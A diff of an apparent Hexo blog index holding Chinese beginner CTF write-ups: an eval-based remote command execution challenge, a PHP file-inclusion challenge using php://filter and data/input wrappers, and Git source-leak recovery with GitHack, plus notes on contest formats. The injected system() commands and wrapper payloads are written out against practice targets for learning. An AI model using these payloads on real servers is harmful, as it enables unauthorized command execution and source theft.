+<h3 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h3><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p>
+<h3 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h3><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>
+<hr>
+<p>搬迁自<a class="link"   href="https://www.wolai.com/ctfhub/mmJYyc569kAXHvfam4qont" >CTF官方指导 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>data</category>
+        <category>another</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -975,37 +1035,51 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>web安全目录</title>
-    <url>/2024/09/12/ctf/writeup/web/catalogue/</url>
-    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
-<ol>
-<li>buuctf<ol>
-<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/" title="极客大挑战2019 Http">[极客大挑战 2019]Http</a></li>
-<li><a href="/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/" title="BUU BURP COURSE 1">BUU-BURP-COURSE-1</a></li>
-<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/" title="web入门-粗心的小李">[web入门]粗心的小李</a></li>
-<li><a href="/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/" title="BJDCTF2020 Mark-loves-cat*">[BJDCTF2020]Mark-loves-cat</a></li>
-<li><a href="/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" title="BJDCTF2020 ZJCTF，不过如此*">[BJDCTF2020]ZJCTF-不过如此</a></li>
-</ol>
+    <title>web安全的做题思路及方法</title>
+    <url>/2024/09/14/ctf/writeup/web/%E7%9B%AE%E5%BD%95/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="做题思路及方法"><a href="#做题思路及方法" class="headerlink" title="做题思路及方法"></a>做题思路及方法</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li><h3 id="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"><a href="#首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题" class="headerlink" title="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"></a>首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164659161.png"
+                      alt="image-20240914164659161"
+                ></p>
+<ul>
+<li>例如这种题目上有明显提示的，就根据提示来下手</li>
+</ul>
 </li>
-<li>ctfhub<ol>
-<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="信息泄露-目录遍历">信息泄露-目录遍历</a></li>
-<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/" title="信息泄露-PHPINFO">信息泄露-PHPINFO</a></li>
-<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露-Log">信息泄露-Git泄露</a></li>
-<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/" title="信息泄露-SVN泄露">信息泄露-SVN泄露</a></li>
-<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/" title="RCE-eval执行">RCE-eval执行</a></li>
-</ol>
+<li><h3 id="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"><a href="#如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了" class="headerlink" title="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"></a>如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164903900.png"
+                      alt="image-20240914164903900"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164924736.png"
+                      alt="image-20240914164924736"
+                ></p>
+<ul>
+<li><p>例如这种的题目，就什么都没有，靶场点开就是一个页面的</p>
+<ul>
+<li>先F12大法（ctrl+U也可以），查看有没有可以利用的信息</li>
+<li>如果没有信息，再扫描目录文件</li>
+</ul>
 </li>
-<li></li>
+</ul>
+</li>
 </ol>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>writeup</category>
         <category>web</category>
+        <category>目录</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>writeup</tag>
+        <tag>总结</tag>
       </tags>
   </entry>
   <entry>
@@ -1106,156 +1180,52 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>BJDCTF2020 ZJCTF，不过如此*</title>
-    <url>/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
-    <content><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此*"></a>[BJDCTF2020]ZJCTF，不过如此*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，这里直接给出了源码，接下来要做的第一步就是代码审计≡(▔﹏▔)≡</p>
+    <title>RCE-eval执行</title>
+    <url>/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="RCE-eval执行"><a href="#RCE-eval执行" class="headerlink" title="RCE-eval执行"></a>RCE-eval执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场之前，题目的名字是<code>eval执行</code>，直接冲着eval执行漏洞去挖</p>
+<p>打开靶场，直接漏出源码，审计一下发现需要我们传入参数<code>cmd</code>，然后它会直接执行我们传入的参数</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914183912618.png"
-                      alt="image-20240914183912618"
+                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224547586.png"
+                      alt="image-20240914224547586"
                 ></p>
-<p>根据源码(..•˘_˘•..)</p>
-<p>第一个if说明我们需要传入<code>text=I have a dream</code>才能进行下面的操作</p>
-<p>下面一个if说明要传入一个<code>file</code>参数，不能传入flag字符防止直接拿到flag</p>
-<p>后面可以看到有<code>include($file)</code>，并且后面加上了注释<code>next.php</code>，表明需要用php伪协议来包含文件，而文件基本就是<code>next.php</code></p>
-<p>那具体怎么做呢？(•ิ_•ิ) </p>
-<p>这里提供两种方法，一种是<code>data</code>伪协议，另一种是<code>php://input</code></p>
+<p>直接传入system函数进行cmd命令输出</p>
+<p>查看目录文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
 <blockquote>
-<p>目前只提供如何提取出文件next.php，后续的涉及其他知识暂且放着，留个坑</p>
+<p>记得要在命令末尾加上;</p>
 </blockquote>
-<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>在<strong>BurpSuite</strong>里面，加上payload：<code>?text=data:text/plain,I have a dream</code></p>
-<p>解第一步if不一样之外，其他后面的内容都一样，这里就不重复了，接着往下看吧</p>
-<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>在<strong>BurpSuite</strong>里面，用<code>php://input</code>传入<code>I have a dream</code>给<code>text</code></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220642475.png"
-                      alt="image-20240914220642475"
+                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224936330.png"
+                      alt="image-20240914224936330"
                 ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220604923.png"
-                      alt="image-20240914220604923"
-                ></p>
-<p>这里只是完成了第一层if判断</p>
-<p>接下来，对于要读取文件file参数，则传入<code>php://filter/read=convert.Base64-encode/resource=next.php</code>。</p>
-<p>解释一下这串payload</p>
-<ul>
-<li>使用的是php的filter协议，用于数据过滤</li>
-<li>read后面跟上需要使用的过滤器，而这里的过滤器就是<code>convert.Base64-encode</code>，表明调用Base64过滤器对文件内容进行编码再输出</li>
-<li>resource后面接输入的文件，文件会被读取然后以Base64的形式输出</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221239456.png"
-                      alt="image-20240914221239456"
-                ></p>
-<p>然后在改包的里面完成操作，读取next.php文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220915984.png"
-                      alt="image-20240914220915984"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221658927.png"
-                      alt="image-20240914221658927"
-                ></p>
-<p>取出这串字符，用Base64解码即可得到next.php文件，提供一个在线解码工具<a class="link"   href="https://www.toolhelper.cn/EncodeDecode/Base64" >锤子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221848920.png"
-                      alt="image-20240914221848920"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221833561.png"
-                      alt="image-20240914221833561"
-                ></p>
-<blockquote>
-<p>之后的代码审计暂时不做，留个坑在这</p>
-</blockquote>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里需要掌握php的文件包含的知识，如果觉得自己不够掌握的推荐看一下<a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这里面基本涵盖了所有的情况，耐心阅读吧~</p>
-<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>writeup</category>
-        <category>web</category>
-        <category>buuctf</category>
-      </categories>
-      <tags>
-        <tag>待填坑</tag>
-        <tag>writeup</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web入门-粗心的小李</title>
-    <url>/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/</url>
-    <content><![CDATA[<h1 id="web入门-粗心的小李"><a href="#web入门-粗心的小李" class="headerlink" title="[web入门]粗心的小李"></a>[web入门]粗心的小李</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场看到是Git泄露，首先就是检测再还原找flag</p>
-<p>会用到工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，需要提前准备，别问为什么两个都要下，接下来你就知道了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913013606873.png"
-                      alt="image-20240913013606873"
-                ></p>
-<p>检测可以通过加&#x2F;.git&#x2F;，若返回是403则说明有可能存在源码泄露；或者通过目录扫描工具检测</p>
-<p>检测出存在可能后使用工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行恢复</p>
-<p>需要用到python2，建议直接kali，kali自带有python2和很多库</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>
+<p>发现目录下面有<code>flag_27537</code>这样的文件，打开看看</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;cat /flag_27537&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014316448.png"
-                      alt="image-20240913014316448"
+                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914225035612.png"
+                      alt="image-20240914225035612"
                 ></p>
-<p>执行后会多出一些文件，既然.git都出来了，那就好说了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014504812.png"
-                      alt="image-20240913014504812"
-                ></p>
-<p>但其实这里是没有我们需要的flag的</p>
-<p>对没错，又是一个坑，我的另一篇<a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露-Log">writeup</a>中，用的这个python2环境才能实现，而这道题要用python3环境的githack，所以之后还是两个都走一遍吧，谁知道呢</p>
-<p>当我们用python3环境的githack时，目录中就有一些可以看得到的文件了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015133582.png"
-                      alt="image-20240913015133582"
-                ></p>
-<p>进去看看，哦，一看我们的flag就出来了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015202941.png"
-                      alt="image-20240913015202941"
-                ></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件使用后却和想要的结果完全不一样的时候，考虑一下版本问题以及查找资料，不要死磕（你又不是高手，啥都磕对身体不好๑乛◡乛๑）</p>
-<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>好家伙flag直接出来了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以看到eval执行的恐怖了吧，直接对服务器进行命令行操作，自己有项目时一定要慎用，要用也要做好防范措施</p>
+<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;RCE-&gt;eval执行</p>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>writeup</category>
         <category>web</category>
-        <category>buuctf</category>
+        <category>ctfhub</category>
       </categories>
       <tags>
         <tag>writeup</tag>
-        <tag>信息泄露</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -1350,42 +1320,485 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>RCE-eval执行</title>
-    <url>/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h1 id="RCE-eval执行"><a href="#RCE-eval执行" class="headerlink" title="RCE-eval执行"></a>RCE-eval执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场之前，题目的名字是<code>eval执行</code>，直接冲着eval执行漏洞去挖</p>
-<p>打开靶场，直接漏出源码，审计一下发现需要我们传入参数<code>cmd</code>，然后它会直接执行我们传入的参数</p>
+    <title>web入门-粗心的小李</title>
+    <url>/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/</url>
+    <content><![CDATA[<h1 id="web入门-粗心的小李"><a href="#web入门-粗心的小李" class="headerlink" title="[web入门]粗心的小李"></a>[web入门]粗心的小李</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场看到是Git泄露，首先就是检测再还原找flag</p>
+<p>会用到工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，需要提前准备，别问为什么两个都要下，接下来你就知道了</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224547586.png"
-                      alt="image-20240914224547586"
+                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913013606873.png"
+                      alt="image-20240913013606873"
                 ></p>
-<p>直接传入system函数进行cmd命令输出</p>
-<p>查看目录文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>检测可以通过加&#x2F;.git&#x2F;，若返回是403则说明有可能存在源码泄露；或者通过目录扫描工具检测</p>
+<p>检测出存在可能后使用工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行恢复</p>
+<p>需要用到python2，建议直接kali，kali自带有python2和很多库</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014316448.png"
+                      alt="image-20240913014316448"
+                ></p>
+<p>执行后会多出一些文件，既然.git都出来了，那就好说了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014504812.png"
+                      alt="image-20240913014504812"
+                ></p>
+<p>但其实这里是没有我们需要的flag的</p>
+<p>对没错，又是一个坑，我的另一篇<a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露">writeup</a>中，用的这个python2环境才能实现，而这道题要用python3环境的githack，所以之后还是两个都走一遍吧，谁知道呢</p>
+<p>当我们用python3环境的githack时，目录中就有一些可以看得到的文件了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015133582.png"
+                      alt="image-20240913015133582"
+                ></p>
+<p>进去看看，哦，一看我们的flag就出来了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015202941.png"
+                      alt="image-20240913015202941"
+                ></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件使用后却和想要的结果完全不一样的时候，考虑一下版本问题以及查找资料，不要死磕（你又不是高手，啥都磕对身体不好๑乛◡乛๑）</p>
+<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>writeup</category>
+        <category>web</category>
+        <category>buuctf</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>信息泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 ZJCTF，不过如此*</title>
+    <url>/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
+    <content><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此*"></a>[BJDCTF2020]ZJCTF，不过如此*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，这里直接给出了源码，接下来要做的第一步就是代码审计≡(▔﹏▔)≡</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914183912618.png"
+                      alt="image-20240914183912618"
+                ></p>
+<p>根据源码(..•˘_˘•..)</p>
+<p>第一个if说明我们需要传入<code>text=I have a dream</code>才能进行下面的操作</p>
+<p>下面一个if说明要传入一个<code>file</code>参数，不能传入flag字符防止直接拿到flag</p>
+<p>后面可以看到有<code>include($file)</code>，并且后面加上了注释<code>next.php</code>，表明需要用php伪协议来包含文件，而文件基本就是<code>next.php</code></p>
+<p>那具体怎么做呢？(•ิ_•ิ) </p>
+<p>这里提供两种方法，一种是<code>data</code>伪协议，另一种是<code>php://input</code></p>
+<blockquote>
+<p>目前只提供如何提取出文件next.php，后续的涉及其他知识暂且放着，留个坑</p>
+</blockquote>
+<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>在<strong>BurpSuite</strong>里面，加上payload：<code>?text=data:text/plain,I have a dream</code></p>
+<p>解第一步if不一样之外，其他后面的内容都一样，这里就不重复了，接着往下看吧</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>在<strong>BurpSuite</strong>里面，用<code>php://input</code>传入<code>I have a dream</code>给<code>text</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220642475.png"
+                      alt="image-20240914220642475"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220604923.png"
+                      alt="image-20240914220604923"
+                ></p>
+<p>这里只是完成了第一层if判断</p>
+<p>接下来，对于要读取文件file参数，则传入<code>php://filter/read=convert.Base64-encode/resource=next.php</code>。</p>
+<p>解释一下这串payload</p>
+<ul>
+<li>使用的是php的filter协议，用于数据过滤</li>
+<li>read后面跟上需要使用的过滤器，而这里的过滤器就是<code>convert.Base64-encode</code>，表明调用Base64过滤器对文件内容进行编码再输出</li>
+<li>resource后面接输入的文件，文件会被读取然后以Base64的形式输出</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221239456.png"
+                      alt="image-20240914221239456"
+                ></p>
